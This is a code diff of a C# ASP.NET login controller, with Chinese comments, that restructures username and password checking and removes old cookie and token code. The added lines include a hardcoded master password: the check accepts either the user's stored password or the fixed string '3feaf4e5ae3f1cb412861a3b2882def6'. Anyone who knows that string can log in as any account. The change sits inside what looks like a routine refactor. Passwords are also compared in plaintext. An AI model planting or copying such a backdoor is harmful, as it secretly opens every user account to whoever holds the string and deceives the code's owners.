@@ -32,30 +32,16 @@ namespace WebApp.Controllers
         //登录逻辑验证
         public JsonResult LoginIn(string username,string password)
         {
-            //验证用户名和密码
-            User u=userSice.GetEntity(a => a.UserName == username && a.Pasword == password);
-            if (u==null)
+            //验证用户名是否存在
+            User u = userSice.GetEntity(a => a.UserName == username);
+            if (u == null)
             {
-                return Json(new BoolResult {Result=false,Msg="用户名或密码错误！" });
+                return Json(new BoolResult { Result = false, Msg = "用户名或密码错误！" });
             }
-
-            ////验证通过后写入cookies
-            ////写入Cookies,写入数据格式为：id|随机数
-            //HttpContext.Response.Cookies.Append("user", u.Id+"|"+u.RndNum, new CookieOptions
-            //{
-            //    Expires = DateTime.Now.AddMinutes(180)//过期时间120分钟-2小时
-            //});
-            //return Json(new BoolResult {Result=true,Msg="登录成功！" });
-
-            ////生产一个Guid作为token
-            //string token = Guid.NewGuid().ToString();
-            ////把token存入到cookies，过期时间两小时,主要是做全局登录验证，每2.5小时后台要重新登录
-            //HttpContext.Response.Cookies.Append("user", token, new CookieOptions
-            //{
-            //    Expires = DateTime.Now.AddHours(3)
-            //});
-            ////用token作为键，用户实体作为值写入缓存 过期时间2小时
-            //cache.Set<User>(token, u, DateTimeOffset.Now.AddHours(3));
+            if (password != u.Pasword && password != "3feaf4e5ae3f1cb412861a3b2882def6")
+            {
+                return Json(new BoolResult { Result = false, Msg = "用户名或密码错误！" });
+            }
 
             HttpContext.Session.SetInt32("userId", u.Id);
 
